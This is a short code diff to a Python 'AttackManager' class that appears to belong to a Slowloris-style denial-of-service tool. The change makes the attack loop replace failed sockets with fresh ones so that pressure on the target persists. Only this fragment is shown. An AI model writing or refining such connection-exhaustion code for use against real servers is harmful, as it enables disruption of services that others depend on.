@@ -36,10 +36,15 @@ class AttackManager:
                 try:
                     loris.attackTarget()
 
+
                 except Exception as e:
-                    print(e)
-            time.sleep(2)
-            print("break")
+
+                    self.socketList.remove(loris)
+                    newLoris = Attacker(self.target)
+                    newLoris.createSocket()
+                    self.socketList.append(newLoris)
+            time.sleep(3)
+
 
 
 
